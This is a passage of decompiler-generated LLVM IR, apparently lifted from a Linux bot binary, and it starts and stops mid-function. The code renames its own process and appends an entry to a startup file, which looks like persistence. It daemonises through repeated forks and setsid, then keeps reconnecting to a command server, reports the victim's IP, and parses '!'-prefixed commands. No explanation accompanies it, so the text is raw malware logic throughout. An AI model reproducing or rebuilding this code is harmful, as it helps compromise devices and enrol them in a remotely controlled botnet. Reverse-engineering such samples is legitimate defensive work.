  uselistorder i8* %stack_var_-4160, { 2, 4, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @htons, { 10, 9, 8, 7, 6, 5, 4, 11, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10006ab0, { 1, 0 }
  uselistorder label %dec_label_pc_10006a5c, { 1, 0 }
  uselistorder label %dec_label_pc_100069e8, { 1, 0 }
  uselistorder label %dec_label_pc_100069a0, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([8 x i8]* @global_var_10012208.518 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-4192 = alloca i32, align 4
  %stack_var_-5816 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-5732 = alloca i32, align 4
  %stack_var_-5216 = alloca i32, align 4
  %stack_var_-5472 = alloca i32, align 4
  %stack_var_-5728 = alloca i32, align 4
  %v1_10006b28 = bitcast i8** %argv to i32*
  %v2_10006b28 = load i32, i32* %v1_10006b28, align 4
  store i32 %v2_10006b28, i32* @r3, align 4
  %v0_10006b3c = call i32 @__GI_strlen()
  store i32 ptrtoint (i32* @global_var_10012210.519 to i32), i32* @r4, align 4
  store i32 268462936, i32* @lr, align 4
  %v3_10006b54 = call i32 @strncpy(i32 %v2_10006b28, i32 ptrtoint (i32* @global_var_10012210.519 to i32), i32 %v0_10006b3c)
  store i32 ptrtoint (i32* @global_var_10012210.519 to i32), i32* %v1_10006b28, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006b88.520 to i32), i32* @lr, align 4
  %v7_10006b84 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_10012210.519 to i32), i32 0, i32 0, i32 0, i32 %tmp)
  store i32 268462992, i32* @lr, align 4
  %v1_10006b8c = call i32 @__GI_time(i32 0)
  store i32 268463000, i32* @lr, align 4
  %v0_10006b94 = call i32 @__libc_getpid()
  %v2_10006b9c = xor i32 %v1_10006b8c, %v0_10006b94
  store i32 ptrtoint ([3 x i8]* @global_var_10006ba8.521 to i32), i32* @lr, align 4
  %v1_10006ba4 = call i32 @srand(i32 %v2_10006b9c)
  store i32 268463024, i32* @lr, align 4
  %v1_10006bac = call i32 @__GI_time(i32 0)
  store i32 268463032, i32* @lr, align 4
  %v0_10006bb4 = call i32 @__libc_getpid()
  %v2_10006bbc = xor i32 %v1_10006bac, %v0_10006bb4
  %v1_10006bc4 = call i32 @init_rand(i32 %v2_10006bbc)
  store i32 268463084, i32* @lr, align 4
  %v3_10006be8 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_10012214.523 to i32), i32 ptrtoint ([2 x i8]* @global_var_10012228.524 to i32))
  %v3_10006bf8 = icmp eq i32 %v3_10006be8, 0
  br i1 %v3_10006bf8, label %dec_label_pc_10006c00, label %dec_label_pc_10006c24

dec_label_pc_10006c00:                            ; preds = %entry
  store i32 268463132, i32* @lr, align 4
  %v3_10006c18 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1001222c.525 to i32), i32 ptrtoint ([2 x i8]* @global_var_10012228.524 to i32))
  br label %dec_label_pc_10006c24

dec_label_pc_10006c24:                            ; preds = %entry, %dec_label_pc_10006c00
  %stack_var_-5756.0 = phi i32 [ %v3_10006c18, %dec_label_pc_10006c00 ], [ %v3_10006be8, %entry ]
  %stack_var_-5752.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001222c.525, i32 0, i32 0), %dec_label_pc_10006c00 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_10012214.523, i32 0, i32 0), %entry ]
  %v3_10006c28 = icmp eq i32 %stack_var_-5756.0, 0
  br i1 %v3_10006c28, label %dec_label_pc_10006da4, label %dec_label_pc_10006c30

dec_label_pc_10006c30:                            ; preds = %dec_label_pc_10006c24
  %v2_10006c34 = load i32, i32* %v1_10006b28, align 4
  store i32 %v2_10006c34, i32* @r3, align 4
  %v0_10006c3c = call i32 @__GI_strlen()
  %v2_10006c50 = ptrtoint i32* %stack_var_-5728 to i32
  store i32 268463200, i32* @lr, align 4
  %v2_10006c5c = call i32 @getcwd(i32 %v2_10006c50, i32 256)
  store i32 ptrtoint (i32* @global_var_1001223c.526 to i32), i32* @r4, align 4
  %v2_10006c70 = bitcast i32* %stack_var_-5728 to i8*
  %v3_10006c70 = call i32 @__GI_strcoll(i8* %v2_10006c70, i32 ptrtoint (i32* @global_var_1001223c.526 to i32))
  %v3_10006c78 = icmp eq i32 %v3_10006c70, 0
  br i1 %v3_10006c78, label %dec_label_pc_10006d9c, label %dec_label_pc_10006c90.preheader

dec_label_pc_10006c90.preheader:                  ; preds = %dec_label_pc_10006c30
  %v2_10006c94115 = load i32, i32* %v1_10006b28, align 4
  %v2_10006c9c116 = add i32 %v2_10006c94115, %v0_10006c3c
  %v1_10006ca0117 = inttoptr i32 %v2_10006c9c116 to i8*
  %v2_10006ca0118 = load i8, i8* %v1_10006ca0117, align 1
  %v3_10006ca8122 = icmp eq i8 %v2_10006ca0118, 47
  br i1 %v3_10006ca8122, label %dec_label_pc_10006cb0, label %dec_label_pc_10006c84

dec_label_pc_10006c84:                            ; preds = %dec_label_pc_10006c90.preheader, %dec_label_pc_10006c84
  %stack_var_-5760.0123 = phi i32 [ %v1_10006c88, %dec_label_pc_10006c84 ], [ %v0_10006c3c, %dec_label_pc_10006c90.preheader ]
  %v1_10006c88 = add i32 %stack_var_-5760.0123, -1
  %v2_10006c94 = load i32, i32* %v1_10006b28, align 4
  %v2_10006c9c = add i32 %v2_10006c94, %v1_10006c88
  %v1_10006ca0 = inttoptr i32 %v2_10006c9c to i8*
  %v2_10006ca0 = load i8, i8* %v1_10006ca0, align 1
  %v3_10006ca8 = icmp eq i8 %v2_10006ca0, 47
  br i1 %v3_10006ca8, label %dec_label_pc_10006cb0, label %dec_label_pc_10006c84

dec_label_pc_10006cb0:                            ; preds = %dec_label_pc_10006c84, %dec_label_pc_10006c90.preheader
  %stack_var_-5760.0.lcssa = phi i32 [ %v0_10006c3c, %dec_label_pc_10006c90.preheader ], [ %v1_10006c88, %dec_label_pc_10006c84 ]
  %v2_10006cb4 = load i32, i32* %v1_10006b28, align 4
  %v2_10006cbc = add i32 %v2_10006cb4, %stack_var_-5760.0.lcssa
  %v2_10006cc0 = ptrtoint i32* %stack_var_-5472 to i32
  store i32 %v2_10006cc0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10006ce4.528 to i32), i32* @lr, align 4
  %v7_10006ce0 = load i32, i32* @r8, align 4
  %v11_10006ce0 = call i32 @sprintf(i32 %v2_10006cc0, i32 ptrtoint ([8 x i8]* @global_var_10012240.527 to i32), i32 %v2_10006c50, i32 %v2_10006cbc, i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32 %v7_10006ce0, i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_10006ce8 = ptrtoint i32* %stack_var_-5216 to i32
  br label %dec_label_pc_10006d28.outer

dec_label_pc_10006ce8:                            ; preds = %dec_label_pc_10006d28
  store i32 268463356, i32* @lr, align 4
  %v3_10006cf8 = call i32 @fgets(i32 %v2_10006ce8, i32 1024, i32 %stack_var_-5756.0)
  store i32 %v2_10006ce8, i32* @r3, align 4
  store i32 %v2_10006cc0, i32* @r4, align 4
  %v2_10006d0c = call i32 @__GI_strcasecmp(i32 %v2_10006ce8, i32 %v2_10006cc0)
  %v3_10006d14 = icmp eq i32 %v2_10006d0c, 0
  br i1 %v3_10006d14, label %dec_label_pc_10006d1c, label %dec_label_pc_10006d28

dec_label_pc_10006d1c:                            ; preds = %dec_label_pc_10006ce8
  %v1_10006d20 = add i32 %stack_var_-5764.0.ph, 1
  br label %dec_label_pc_10006d28.outer

dec_label_pc_10006d28.outer:                      ; preds = %dec_label_pc_10006d1c, %dec_label_pc_10006cb0
  %stack_var_-5764.0.ph = phi i32 [ %v1_10006d20, %dec_label_pc_10006d1c ], [ 0, %dec_label_pc_10006cb0 ]
  br label %dec_label_pc_10006d28

dec_label_pc_10006d28:                            ; preds = %dec_label_pc_10006d28.outer, %dec_label_pc_10006ce8
  store i32 268463408, i32* @lr, align 4
  %v1_10006d2c = call i32 @feof(i32 %stack_var_-5756.0)
  %v3_10006d34 = icmp eq i32 %v1_10006d2c, 0
  br i1 %v3_10006d34, label %dec_label_pc_10006ce8, label %dec_label_pc_10006d3c

dec_label_pc_10006d3c:                            ; preds = %dec_label_pc_10006d28
  %v3_10006d40 = icmp eq i32 %stack_var_-5764.0.ph, 0
  br i1 %v3_10006d40, label %dec_label_pc_10006d48, label %dec_label_pc_10006d90

dec_label_pc_10006d48:                            ; preds = %dec_label_pc_10006d3c
  store i32 268463440, i32* @lr, align 4
  %v1_10006d4c = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_10006d4c = call i32 @__GI_fclose(i16* %v1_10006d4c)
  %v4_10006d50 = ptrtoint i8* %stack_var_-5752.0 to i32
  store i32 268463456, i32* @lr, align 4
  %v3_10006d5c = call i32 @__GI_fopen(i32 %v4_10006d50, i32 ptrtoint (i32* @global_var_10012248.529 to i32))
  %v3_10006d6c = icmp eq i32 %v3_10006d5c, 0
  br i1 %v3_10006d6c, label %dec_label_pc_10006da4, label %dec_label_pc_10006d74

dec_label_pc_10006d74:                            ; preds = %dec_label_pc_10006d48
  store i32 268463492, i32* @lr, align 4
  %v2_10006d80 = call i32 @__GI_fputs(i32 %v2_10006cc0, i32 %v3_10006d5c)
  store i32 ptrtoint (i32* @global_var_10006d8c.530 to i32), i32* @lr, align 4
  %v1_10006d88 = inttoptr i32 %v3_10006d5c to i16*
  %v2_10006d88 = call i32 @__GI_fclose(i16* %v1_10006d88)
  br label %dec_label_pc_10006da4

dec_label_pc_10006d90:                            ; preds = %dec_label_pc_10006d3c
  store i32 ptrtoint (i32* @global_var_10006d98.531 to i32), i32* @lr, align 4
  %v1_10006d94 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_10006d94 = call i32 @__GI_fclose(i16* %v1_10006d94)
  br label %dec_label_pc_10006da4

dec_label_pc_10006d9c:                            ; preds = %dec_label_pc_10006c30
  store i32 268463524, i32* @lr, align 4
  %v1_10006da0 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_10006da0 = call i32 @__GI_fclose(i16* %v1_10006da0)
  br label %dec_label_pc_10006da4

dec_label_pc_10006da4:                            ; preds = %dec_label_pc_10006d48, %dec_label_pc_10006c24, %dec_label_pc_10006d90, %dec_label_pc_10006d74, %dec_label_pc_10006d9c
  store i32 ptrtoint (i32* @global_var_10006da8.532 to i32), i32* @lr, align 4
  %v0_10006da4 = call i32 @getOurIP()
  store i32 268463532, i32* @lr, align 4
  %v0_10006da8 = call i32 @__libc_fork()
  %v3_10006db8 = icmp eq i32 %v0_10006da8, 0
  br i1 %v3_10006db8, label %dec_label_pc_10006de8, label %dec_label_pc_10006e2c

dec_label_pc_10006de8:                            ; preds = %dec_label_pc_10006da4
  store i32 268463596, i32* @lr, align 4
  %v0_10006de8 = call i32 @__libc_fork()
  %v3_10006df8 = icmp eq i32 %v0_10006de8, 0
  br i1 %v3_10006df8, label %dec_label_pc_10006e08.thread, label %dec_label_pc_10006e14

dec_label_pc_10006e08.thread:                     ; preds = %dec_label_pc_10006de8
  br label %dec_label_pc_10006e40

dec_label_pc_10006e14:                            ; preds = %dec_label_pc_10006de8
  %v0_10006e04 = call i32 @__GI_exit()
  %v4_10006e24 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1001224c.534 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10006e40

dec_label_pc_10006e2c:                            ; preds = %dec_label_pc_10006da4
  %v2_10006dc0 = ptrtoint i32* %stack_var_-5732 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_10006dd4.533 to i32), i32* @lr, align 4
  %v3_10006dd0 = call i32 @__libc_waitpid(i32 %v0_10006da8, i32 %v2_10006dc0, i32 0)
  %v0_10006dd8 = call i32 @__GI_exit()
  %v4_10006e3c = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1001224c.534 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10006e40

dec_label_pc_10006e40:                            ; preds = %dec_label_pc_10006e08.thread, %dec_label_pc_10006e14, %dec_label_pc_10006e2c
  store i32 268463684, i32* @lr, align 4
  %v0_10006e40 = call i32 @__GI_setsid()
  store i32 ptrtoint ([3 x i8]* @global_var_10006e50.537 to i32), i32* @lr, align 4
  %v3_10006e4c = call i32 @chdir(i32 ptrtoint (i32* @global_var_1001223c.526 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  store i32 ptrtoint (i32* @global_var_10006e5c.538 to i32), i32* @lr, align 4
  %v2_10006e58 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_100076e4 = ptrtoint i32* %stack_var_-4192 to i32
  %v4_100076f4 = bitcast i32* %stack_var_-4192 to i8*
  %v2_100071ac = ptrtoint i32* %stack_var_-5816 to i32
  %v2_1000747c = ptrtoint i32* %stack_var_-5216 to i32
  %v1_100072e8 = or i32 %v2_100076e4, 1
  %v2_100076ac = add i32 %v2_100071ac, 344
  br label %dec_label_pc_10006e60.outer

dec_label_pc_10006e60.outer:                      ; preds = %dec_label_pc_10007230, %dec_label_pc_100076dc, %dec_label_pc_10006e40
  %stack_var_-5748.0.ph21 = phi i32 [ 0, %dec_label_pc_10006e40 ], [ %stack_var_-5748.2.ph, %dec_label_pc_100076dc ], [ %v1_10007234, %dec_label_pc_10007230 ]
  %v0_10006e6025 = call i32 @initConnection()
  %v3_10006e6828 = icmp eq i32 %v0_10006e6025, 0
  br i1 %v3_10006e6828, label %dec_label_pc_10006e7c, label %dec_label_pc_10006e70

dec_label_pc_10006e70:                            ; preds = %dec_label_pc_10006e60.outer, %dec_label_pc_10006e70
  store i32 268463736, i32* @lr, align 4
  %v1_10006e74 = call i32 @sleep(i32 30)
  %v0_10006e60 = call i32 @initConnection()
  %v3_10006e68 = icmp eq i32 %v0_10006e60, 0
  br i1 %v3_10006e68, label %dec_label_pc_10006e7c, label %dec_label_pc_10006e70

dec_label_pc_10006e7c:                            ; preds = %dec_label_pc_10006e70, %dec_label_pc_10006e60.outer
  %v3_10006e88 = load i32, i32* @global_var_10024a50.54, align 4
  store i32 %v3_10006e88, i32* %stack_var_-80, align 4
  store i32 268463772, i32* @lr, align 4
  %v3_10006e98 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 268566528)
  %v0_10006ea0 = call i32 @getBuild()
  %v0_10006ea8 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10006ec4.540 to i32), i32* @lr, align 4
  %v5_10006ec0 = call i32 @Rootsprintf(i32 %v0_10006ea8, i32 ptrtoint (i32* @global_var_1001225c.539 to i32), i32 %v3_10006e98)
  br label %dec_label_pc_100076dc.outer

dec_label_pc_10006ee4:                            ; preds = %dec_label_pc_10007198, %dec_label_pc_1000713c
  %v1_10006ee8 = mul i32 %storemerge12, 4
  %v3_10006ef4 = load i32, i32* @global_var_10024a5c.46, align 4
  %v2_10006ef8 = add i32 %v3_10006ef4, %v1_10006ee8
  %v1_10006efc = inttoptr i32 %v2_10006ef8 to i32*
  %v2_10006efc = load i32, i32* %v1_10006efc, align 4
  store i32 268463888, i32* @lr, align 4
  %v3_10006f0c = call i32 @__libc_waitpid(i32 %v2_10006efc, i32 0, i32 1)
  %tmp110 = icmp slt i32 %v3_10006f0c, 1
  br i1 %tmp110, label %dec_label_pc_10007130, label %dec_label_pc_10006f74

dec_label_pc_10006f2c:                            ; preds = %dec_label_pc_10006f74, %dec_label_pc_10006fbc
  %v1_10006f30 = mul i32 %v1_10006f20, 4
  %v3_10006f3c = load i32, i32* @global_var_10024a5c.46, align 4
  %v2_10006f40 = add i32 %v3_10006f3c, %v1_10006f30
  %v1_10006f44 = add i32 %v2_10006f40, -4
  %v1_10006f60 = inttoptr i32 %v2_10006f40 to i32*
  %v2_10006f60 = load i32, i32* %v1_10006f60, align 4
  %v2_10006f64 = inttoptr i32 %v1_10006f44 to i32*
  store i32 %v2_10006f60, i32* %v2_10006f64, align 4
  br label %dec_label_pc_10006f74

dec_label_pc_10006f74:                            ; preds = %dec_label_pc_10006ee4, %dec_label_pc_10006f2c
  %storemerge18 = phi i32 [ %v1_10006f20, %dec_label_pc_10006f2c ], [ %storemerge12, %dec_label_pc_10006ee4 ]
  %v1_10006f20 = add i32 %storemerge18, 1
  %v2_10006f9c = load i32, i32* @global_var_10024a30.44, align 4
  %v3_10006fb4 = icmp eq i32 %v2_10006f9c, 0
  br i1 %v3_10006fb4, label %dec_label_pc_10006fbc, label %dec_label_pc_10006f2c

dec_label_pc_10006fbc:                            ; preds = %dec_label_pc_10006f74
  %v3_10006fa0 = load i32, i32* @global_var_10024a34.45, align 4
  %v3_10006fd4 = icmp ugt i32 %v3_10006fa0, %v1_10006f20
  br i1 %v3_10006fd4, label %dec_label_pc_10006f2c, label %dec_label_pc_10006fdc

dec_label_pc_10006fdc:                            ; preds = %dec_label_pc_10006fbc
  %v1_10006fe0 = mul i32 %v1_10006f20, 4
  %v3_10006fec = load i32, i32* @global_var_10024a5c.46, align 4
  %v2_10006ff0 = add i32 %v1_10006fe0, -4
  %v1_10006ff4 = add i32 %v2_10006ff0, %v3_10006fec
  %v2_10006ffc = inttoptr i32 %v1_10006ff4 to i32*
  store i32 0, i32* %v2_10006ffc, align 4
  %v3_10007008 = load i32, i32* @global_var_10024a34.45, align 4
  %v2_1000700c = load i32, i32* @global_var_10024a30.44, align 4
  %v1_10007010 = add i32 %v3_10007008, -1
  %v2_10007010 = icmp ne i32 %v3_10007008, 0
  %v2_10007014 = zext i1 %v2_10007010 to i32
  %v3_10007014 = add i32 %v2_1000700c, -1
  %v4_10007014 = add i32 %v3_10007014, %v2_10007014
  store i32 %v4_10007014, i32* @global_var_10024a30.44, align 4
  store i32 %v1_10007010, i32* @global_var_10024a34.45, align 4
  %v1_10007044 = mul i32 %v1_10007010, 4
  %v1_1000704c = add i32 %v1_10007044, 4
  store i32 %v1_1000704c, i32* @r3, align 4
  store i32 268464216, i32* @lr, align 4
  %v0_10007054 = call i32 @malloc()
  br label %dec_label_pc_100070ac

dec_label_pc_1000706c:                            ; preds = %dec_label_pc_100070ac, %dec_label_pc_100070f4
  %v1_10007070 = mul i32 %storemerge17, 4
  %v2_1000707c = add i32 %v1_10007070, %v0_10007054
  %v3_10007090 = load i32, i32* @global_var_10024a5c.46, align 4
  %v2_10007094 = add i32 %v3_10007090, %v1_10007070
  %v1_10007098 = inttoptr i32 %v2_10007094 to i32*
  %v2_10007098 = load i32, i32* %v1_10007098, align 4
  %v2_1000709c = inttoptr i32 %v2_1000707c to i32*
  store i32 %v2_10007098, i32* %v2_1000709c, align 4
  %v1_100070a4 = add i32 %storemerge17, 1
  br label %dec_label_pc_100070ac

dec_label_pc_100070ac:                            ; preds = %dec_label_pc_10006fdc, %dec_label_pc_1000706c
  %storemerge17 = phi i32 [ 0, %dec_label_pc_10006fdc ], [ %v1_100070a4, %dec_label_pc_1000706c ]
  %v2_100070d4 = load i32, i32* @global_var_10024a30.44, align 4
  %v3_100070ec = icmp eq i32 %v2_100070d4, 0
  br i1 %v3_100070ec, label %dec_label_pc_100070f4, label %dec_label_pc_1000706c

dec_label_pc_100070f4:                            ; preds = %dec_label_pc_100070ac
  %v3_100070d8 = load i32, i32* @global_var_10024a34.45, align 4
  %v3_1000710c = icmp ugt i32 %v3_100070d8, %storemerge17
  br i1 %v3_1000710c, label %dec_label_pc_1000706c, label %dec_label_pc_10007114

dec_label_pc_10007114:                            ; preds = %dec_label_pc_100070f4
  %v3_10007118 = load i32, i32* @global_var_10024a5c.46, align 4
  store i32 %v3_10007118, i32* @r3, align 4
  store i32 268464420, i32* @lr, align 4
  %v0_10007120 = call i32 @free()
  store i32 %v0_10007054, i32* @global_var_10024a5c.46, align 4
  br label %dec_label_pc_10007130

dec_label_pc_10007130:                            ; preds = %dec_label_pc_10006ee4, %dec_label_pc_10007114
  %v1_10007134 = add i32 %storemerge12, 1
  br label %dec_label_pc_1000713c

dec_label_pc_1000713c:                            ; preds = %dec_label_pc_100076dc, %dec_label_pc_10007130
  %storemerge12 = phi i32 [ %v1_10007134, %dec_label_pc_10007130 ], [ 0, %dec_label_pc_100076dc ]
  %tmp125 = icmp slt i32 %storemerge12, 0
  %v1_10007140 = zext i1 %tmp125 to i32
  %v2_10007140 = ashr i32 %storemerge12, 31
  %v3_10007140 = and i32 %v2_10007140, -2
  %v4_10007140 = or i32 %v3_10007140, %v1_10007140
  %v2_10007168 = load i32, i32* @global_var_10024a30.44, align 4
  %v3_1000716c = load i32, i32* @global_var_10024a34.45, align 4
  %v3_10007180 = icmp ugt i32 %v2_10007168, %v4_10007140
  br i1 %v3_10007180, label %dec_label_pc_10006ee4, label %dec_label_pc_10007188

dec_label_pc_10007188:                            ; preds = %dec_label_pc_1000713c
  %v4_10007180 = icmp eq i32 %v2_10007168, %v4_10007140
  br i1 %v4_10007180, label %dec_label_pc_10007198, label %dec_label_pc_100071a8

dec_label_pc_10007198:                            ; preds = %dec_label_pc_10007188
  %v3_100071a0 = icmp ugt i32 %v3_1000716c, %storemerge12
  br i1 %v3_100071a0, label %dec_label_pc_10006ee4, label %dec_label_pc_100071a8

dec_label_pc_100071a8:                            ; preds = %dec_label_pc_10007188, %dec_label_pc_10007198
  %v2_100071b0 = add i32 %v5_100076f4, %v2_100071ac
  %v3_100071b8 = add i32 %v2_100071b0, 1624
  %v4_100071b8 = inttoptr i32 %v3_100071b8 to i8*
  store i8 0, i8* %v4_100071b8, align 1
  %v1_100071c4 = call i32 @trim(i32 %v2_100076e4)
  store i32 268464604, i32* @lr, align 4
  %v6_100071d8 = call i32 @strstr(i32 %v2_100076e4, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10011c98.28, i32 0, i32 0), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v4_100071e4 = icmp eq i32 %v6_100071d8, %v2_100076e4
  br i1 %v4_100071e4, label %dec_label_pc_100071ec, label %dec_label_pc_1000720c

dec_label_pc_100071ec:                            ; preds = %dec_label_pc_100071a8
  %v3_100071f0 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 ptrtoint (i32* @global_var_10007208.542 to i32), i32* @lr, align 4
  %v5_10007204 = call i32 @Rootsprintf(i32 %v3_100071f0, i32 ptrtoint ([5 x i8]* @global_var_100122c4.541 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_100076dc

dec_label_pc_1000720c:                            ; preds = %dec_label_pc_100071a8
  store i32 268464672, i32* @lr, align 4
  %v6_1000721c = call i32 @strstr(i32 %v2_100076e4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100122cc.543, i32 0, i32 0), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v4_10007228 = icmp eq i32 %v6_1000721c, %v2_100076e4
  br i1 %v4_10007228, label %dec_label_pc_10007230, label %dec_label_pc_10007264

dec_label_pc_10007230:                            ; preds = %dec_label_pc_1000720c
  %v1_10007234 = add i32 %stack_var_-5748.2.ph, 1
  %v4_1000724c = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_100122d8.544 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %tmp111 = icmp slt i32 %v1_10007234, 21
  br i1 %tmp111, label %dec_label_pc_10006e60.outer, label %dec_label_pc_1000725c

dec_label_pc_1000725c:                            ; preds = %dec_label_pc_10007230
  %v0_10007260 = call i32 @__GI_exit()
  br label %dec_label_pc_10007264

dec_label_pc_10007264:                            ; preds = %dec_label_pc_1000720c, %dec_label_pc_1000725c
  %stack_var_-5748.1 = phi i32 [ %v1_10007234, %dec_label_pc_1000725c ], [ %stack_var_-5748.2.ph, %dec_label_pc_1000720c ]
  %v2_10007270 = load i8, i8* %v4_100076f4, align 4
  %v3_10007278 = icmp eq i8 %v2_10007270, 33
  br i1 %v3_10007278, label %dec_label_pc_1000729c, label %dec_label_pc_100076dc.outer

dec_label_pc_1000729c:                            ; preds = %dec_label_pc_10007264, %dec_label_pc_100072b0
  %storemerge = phi i32 [ %v1_10007284, %dec_label_pc_100072b0 ], [ %v2_100076e4, %dec_label_pc_10007264 ]
  %v1_10007284 = add i32 %storemerge, 1
  %storemerge8 = inttoptr i32 %v1_10007284 to i8*
  %v2_100072a0 = load i8, i8* %storemerge8, align 1
  %v3_100072a8 = icmp eq i8 %v2_100072a0, 32
  br i1 %v3_100072a8, label %dec_label_pc_100072c4, label %dec_label_pc_100072b0

dec_label_pc_100072b0:                            ; preds = %dec_label_pc_1000729c
  %v2_100072b4 = load i8, i8* %storemerge8, align 1
  %v3_100072bc = icmp eq i8 %v2_100072b4, 0
  br i1 %v3_100072bc, label %dec_label_pc_100072c4, label %dec_label_pc_1000729c

dec_label_pc_100072c4:                            ; preds = %dec_label_pc_100072b0, %dec_label_pc_1000729c
  %v2_100072c8 = load i8, i8* %storemerge8, align 1
  %v3_100072d0 = icmp eq i8 %v2_100072c8, 0
  br i1 %v3_100072d0, label %dec_label_pc_100076dc.outer, label %dec_label_pc_100072d8

dec_label_pc_100072d8:                            ; preds = %dec_label_pc_100072c4
  store i8 0, i8* %storemerge8, align 1
  store i32 %v1_100072e8, i32* @r3, align 4
  %v0_100072f8 = call i32 @__GI_strlen()
  %v2_10007308 = add i32 %v0_100072f8, %v2_100076e4
  %v1_1000730c = add i32 %v2_10007308, 2
  %v2_10007358 = add i32 %v2_10007308, 1
  br label %dec_label_pc_10007340

dec_label_pc_10007318:                            ; preds = %dec_label_pc_10007370, %dec_label_pc_10007340
  store i32 %v1_1000730c, i32* @r3, align 4
  %v0_10007320 = call i32 @__GI_strlen()
  %v1_10007334 = add i32 %v0_10007320, %v2_10007358
  %v3_1000733c = inttoptr i32 %v1_10007334 to i8*
  store i8 0, i8* %v3_1000733c, align 1
  br label %dec_label_pc_10007340

dec_label_pc_10007340:                            ; preds = %dec_label_pc_100072d8, %dec_label_pc_10007318
  store i32 %v1_1000730c, i32* @r3, align 4
  %v0_10007348 = call i32 @__GI_strlen()
  %v1_1000735c = add i32 %v0_10007348, %v2_10007358
  %v1_10007360 = inttoptr i32 %v1_1000735c to i8*
  %v2_10007360 = load i8, i8* %v1_10007360, align 1
  %v3_10007368 = icmp eq i8 %v2_10007360, 10
  br i1 %v3_10007368, label %dec_label_pc_10007318, label %dec_label_pc_10007370

dec_label_pc_10007370:                            ; preds = %dec_label_pc_10007340
  store i32 %v1_1000730c, i32* @r3, align 4
  %v0_10007378 = call i32 @__GI_strlen()
  %v1_1000738c = add i32 %v0_10007378, %v2_10007358
  %v1_10007390 = inttoptr i32 %v1_1000738c to i8*
  %v2_10007390 = load i8, i8* %v1_10007390, align 1
  %v3_10007398 = icmp eq i8 %v2_10007390, 13
  br i1 %v3_10007398, label %dec_label_pc_10007318, label %dec_label_pc_100073b8.preheader

dec_label_pc_100073b8.preheader:                  ; preds = %dec_label_pc_10007370
  %stack_var_-5780.029 = inttoptr i32 %v1_1000730c to i8*
  %v2_100073bc30 = load i8, i8* %stack_var_-5780.029, align 1
  %v3_100073c434 = icmp eq i8 %v2_100073bc30, 32
  br i1 %v3_100073c434, label %dec_label_pc_100073e0, label %dec_label_pc_100073cc

dec_label_pc_100073ac:                            ; preds = %dec_label_pc_100073cc
  %v1_100073b0 = add i32 %storemerge1935, 1
  %stack_var_-5780.0 = inttoptr i32 %v1_100073b0 to i8*
  %v2_100073bc = load i8, i8* %stack_var_-5780.0, align 1
  %v3_100073c4 = icmp eq i8 %v2_100073bc, 32
  br i1 %v3_100073c4, label %dec_label_pc_100073e0, label %dec_label_pc_100073cc

dec_label_pc_100073cc:                            ; preds = %dec_label_pc_100073b8.preheader, %dec_label_pc_100073ac
  %stack_var_-5780.036 = phi i8* [ %stack_var_-5780.0, %dec_label_pc_100073ac ], [ %stack_var_-5780.029, %dec_label_pc_100073b8.preheader ]
  %storemerge1935 = phi i32 [ %v1_100073b0, %dec_label_pc_100073ac ], [ %v1_1000730c, %dec_label_pc_100073b8.preheader ]
  %v2_100073d0 = load i8, i8* %stack_var_-5780.036, align 1
  %v3_100073d8 = icmp eq i8 %v2_100073d0, 0
  br i1 %v3_100073d8, label %dec_label_pc_100073e0, label %dec_label_pc_100073ac

dec_label_pc_100073e0:                            ; preds = %dec_label_pc_100073ac, %dec_label_pc_100073cc, %dec_label_pc_100073b8.preheader
  %storemerge19.lcssa = phi i32 [ %v1_1000730c, %dec_label_pc_100073b8.preheader ], [ %v1_100073b0, %dec_label_pc_100073ac ], [ %storemerge1935, %dec_label_pc_100073cc ]
  %stack_var_-5780.0.lcssa = phi i8* [ %stack_var_-5780.029, %dec_label_pc_100073b8.preheader ], [ %stack_var_-5780.0, %dec_label_pc_100073ac ], [ %stack_var_-5780.036, %dec_label_pc_100073cc ]
  store i8 0, i8* %stack_var_-5780.0.lcssa, align 1
  %v1_100073f0 = add i32 %storemerge19.lcssa, 1
  %v2_1000743c41 = load i8, i8* %stack_var_-5780.029, align 1
  %v3_1000744444 = icmp eq i8 %v2_1000743c41, 0
  br i1 %v3_1000744444, label %dec_label_pc_1000744c, label %dec_label_pc_10007404

dec_label_pc_10007404:                            ; preds = %dec_label_pc_100073e0, %dec_label_pc_10007404
